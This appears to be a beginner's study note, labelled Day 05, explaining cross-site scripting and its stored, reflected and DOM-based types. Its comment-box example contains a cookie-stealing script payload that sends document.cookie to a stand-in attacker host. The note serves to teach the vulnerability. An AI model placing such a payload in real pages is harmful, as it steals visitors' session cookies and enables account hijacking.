# Day 05 - Cross-Site Scripting (XSS)

## What It Is
Cross-Site Scripting (XSS) is a web attack where malicious JavaScript is injected into a webpage that other users then load in their browsers. Unlike SQL Injection which targets the database, XSS targets the users visiting the site. The attacker's script runs in the victim's browser with full trust of the legitimate site.

## How It Works
Web apps often take user input and display it back on the page — comment sections, search bars, profile fields. If that input isn't sanitized before being rendered, an attacker can inject a script tag and the browser will execute it as legitimate code.

Simple example - a comment box:
```html
<!-- Attacker posts this as a comment -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- When any user loads the page, their browser executes it -->
<!-- Their session cookie gets sent to the attacker's server -->
```

There are three main types:
- Stored XSS: malicious script is saved in the database and served to every user who visits (most dangerous)
- Reflected XSS: script is embedded in a URL, only executes when victim clicks that specific link
- DOM-based XSS: script manipulates the page's DOM directly in the browser, never touches the server
